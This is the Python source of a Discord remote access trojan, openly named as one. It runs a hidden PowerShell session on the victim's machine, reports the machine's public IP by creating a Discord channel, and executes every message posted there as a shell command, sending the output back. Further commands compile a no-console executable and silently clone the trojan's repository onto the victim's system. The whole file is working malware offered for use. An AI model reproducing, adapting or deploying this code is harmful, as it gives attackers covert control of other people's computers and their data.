from discord.ext import commands
from pathlib import Path
import discord
import urllib.request
import requests
import subprocess
import inspect
import shutil
import time
import os
import sys

DISCORD_TOKEN = "DISCORD_BOT_TOCKEN_HERE"

TARGET_DIR = r"C:\Users\DiscordRAT-SAVE"
EXE_DIR = r"C:\Users\DiscordRAT.py"

GIT_DIR = os.path.join(os.getenv("LOCALAPPDATA"), "GitPortable")
GIT_EXE = os.path.join(GIT_DIR, "cmd", "git.exe")

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

def find_portable_git():
    """Return the full path to portable git.exe if it exists, else None."""
    if not os.path.exists(GIT_DIR):
        return None

    # Look for a folder starting with "PortableGit"
    for name in os.listdir(GIT_DIR):
        full = os.path.join(GIT_DIR, name)
        if os.path.isdir(full) and name.lower().startswith("portablegit"):
            git_path = os.path.join(full, "cmd", "git.exe")
            if os.path.exists(git_path):
                return git_path

    return None
    
def open_terminal_with_command(command):
    subprocess.Popen(["cmd", "/k", command])

def open_terminal_with_command(command: str):
    subprocess.Popen(["cmd", "/k", command])

def check_git_installation():
    """
    Checks for Git in two locations:
    1. System PATH (shutil.which)
    2. Portable Git folder in LOCALAPPDATA/GitPortable/cmd/git.exe

    Returns:
        (ok: bool, message: str, git_path: str or None)
    """

    system_git = shutil.which("git")
    if system_git:
        return True, "System Git found.", system_git

    portable_dir = Path(os.getenv("LOCALAPPDATA", "")) / "GitPortable" / "cmd" / "git.exe"
    if portable_dir.exists():
        return True, "Portable Git found.", str(portable_dir)

    return False, "No Git installation detected.", None

def clone_repo_silent(repo_url, target_dir, git_binary):
    os.makedirs(target_dir, exist_ok=True)

    subprocess.run(
        [git_binary, "clone", repo_url, target_dir],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )

def build_exe(script_path, onefile=True):
    args = [sys.executable, "-m", "PyInstaller"]

    if onefile:
        args += ["--onefile", "--noconsole"]

    args.append(script_path)
    subprocess.run(args, shell=True)

def move_pyinstaller_output(target_dir):
    dist_dir = os.path.join(os.getcwd(), "dist")
    build_dir = os.path.join(os.getcwd(), "build")
    spec_file = None

    for file in os.listdir(os.getcwd()):
        if file.endswith(".spec"):
            spec_file = os.path.join(os.getcwd(), file)
            break

    if os.path.exists(dist_dir):
        shutil.move(dist_dir, os.path.join(target_dir, "dist"))

    if os.path.exists(build_dir):
        shutil.move(build_dir, os.path.join(target_dir, "build"))

    if spec_file and os.path.exists(spec_file):
        shutil.move(spec_file, os.path.join(target_dir, os.path.basename(spec_file)))    
  
  
def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    
    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """
    
    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())
    return "\n".join(output)

@client.event
async def on_ready():
    global channel
    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
    channel = await guild.create_text_channel("Computer: " + ip)
   
    ascii_art = r"""

    ................................................:::-:.................... . --:.....................
    ..........:::::...........::::::::::--======.##########.======---------==.. ===:-:..................
    ====-:-----=============================##########.##=.. ================.. ===-----:::::...........
    ======================================############..#=    ===============.. ==.=====================
    ====================================############....#.    ===============.. ==.=====================
    =================================##############  #.        ==============.. ========================
    ==============================.  ############=   #.         =============#. ========================
    ================================.     ###.#.#.  #.           ============.. ========================
    =================================       .#..#  ..             ===========.. ========================
    =================================         ..                  ==========-##.========================
    =================================@          .                  =========.#  ========================
    ==================================.         .                    =======..   =======================
    ===================================#         .      #.            ======@.   =======================
    ======-============================@         #    #.   ##.         ======.  ========================
    ==..##..#######............=========#         .  .  #####....       -=.==    =.=====================
    ==..######@###########################        . ##### ##....         =  =   ##==#..######........===
    ==..###=@=@###########################       ####.##.   .               .   #@.##################===
    ==..###===#############################     #=#######=  .:                  =. .#############===@===
    ==..###=################################    ######     .                    = =####..#######====*@==
    ==..###.################################    .    = ==  =-                      .############=====@==
    *=..###=#@##############################            =  =                       =-###########========
    @=..###=##.#############################     #.# ..   .=                        ############====@===
    @=..###=###############################*    ### #.                             .############====@===
    @=..###=##.############################.    ### #. .                            #################===
    @=..###=##=############################=   @.# #.  .                             ################===
    @=..###=##################################### ##=                                ##############=#===
    @=..###=###############.=########@######  #.###..                               .###########@====@@@
    @=..###=############..## .## ######      ####                                    ###########%====..:
    ....###=##@@#######.......  #####   #   ##= #= =                                 .##########-.### ..
    ....##############..     . :#=#..       #. =                                       ...--:...........
    .. .############. ..      # .####-       =.-  =                                    ##.....:.........
    ..........###.  ....      .###.### #- ##  =                                      = #####.#=.........
    .............. .#......   . ####### #####.                                         .#....... ... ...
    ............############   #. .#.   .==                                           .. .....##........
    ...#########.##########:  #   ...  .                                               .#.+..-#..#......
    ####################..  .#.     .  .                                              ...:.#............
            
    
                ████████╗██╗  ██╗███████╗      ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗██████╗ 
                ╚══██╔══╝██║  ██║██╔════╝      ██╔══██╗ ╚════██╗██║  ██║██╔══██╗██╔════╝██╔══██╗
                   ██║   ███████║█████╗ █████╗ ██████╔╝  █████╔╝███████║██████╔╝█████╗  ██████╔╝
                   ██║   ██╔══██║██╔══╝ ╚════╝ ██╔══██╗  ╚═══██╗╚════██║██╔═══╝ ██╔══╝  ██╔═██╗
                   ██║   ██║  ██║███████╗      ██║   ██║██████╔╝     ██║██║     ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚══════╝      ╚═╝   ╚═╝╚═════╝      ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                    
                                    Discord Remote Access Tool/Trojan (RAT)
                                            Created by: The-R34per
                                                
                                 GitHub: https://github.com/The-R34per
                   Website: https://the-r34per.github.io/The-R34per-Website/index.html                                               
                                               
    -----------------------------------------------------------------------------------------------------
    Basic Commands:
    
    ls = List current directory
    cd <directory> = Change directory
    echo <message> = Says <message> back to user
        
    -----------------------------------------------------------------------------------------------------
    Custom Commands:
    
    "shutdown" = Terminates this session
    "create-exe" = Creates an executable file and stores in in a file
    "create-clone" = creates a clone of the repository and stores it locally on the victims' system
    
    -----------------------------------------------------------------------------------------------------
    Examples:
    
    "cd Destop"
    This changes your directory to user's desktop
    ---
    "echo "Hello World" > hello.txt" 
    This creates a file called "hello.txt" in the current directory with the text "Hello World"
"""

    chunks = [ascii_art[i:i+1900] for i in range(0, len(ascii_art), 1900)]
    for part in chunks:
        await channel.send(f"```\n{part}\n```")
    
@client.event
async def on_message(message):
    if not channel or message.channel.id != channel.id:
        return

    if message.author.bot:
        return
    
    result = execute_cmd(message.content) or f"Executed \"{message.content}\" with no output."
    
    if message.content.lower() == "shutdown":
        await message.channel.send("RAT Bot is shutting down...")
        await client.close()
        return
    
    if message.content.lower() == "create-exe":
        await message.channel.send("Creating a executable file of the source script...")
        build_exe(EXE_DIR)
        move_pyinstaller_output(TARGET_DIR)
        await message.channel.send(f"Executable successfully created at {TARGET_DIR}\\dist")
        return
    
    if message.content.lower() == "create-clone":
        ok, msg, git_path = check_git_installation()
        await message.channel.send(f"```{msg}```")

        if not ok:
            await message.channel.send("Git is not installed. Opening a terminal with the install command.")
            open_terminal_with_command("winget install --id Git.Git -e --source winget")
            return
        await message.channel.send("Git is installed, proceeding with clone...")
        
        repo_url = "https://github.com/The-R34per/Discord-Remote-Access-Trojan"
        clone_repo_silent(repo_url, TARGET_DIR, git_path)
        
        await message.channel.send(f"Clone created at {TARGET_DIR}.")
        return
    
    while True:
        await message.channel.send(result[:2000])
        if len(result) < 2000:
            break
        result = result[2000:]
        
client.run(DISCORD_TOKEN)

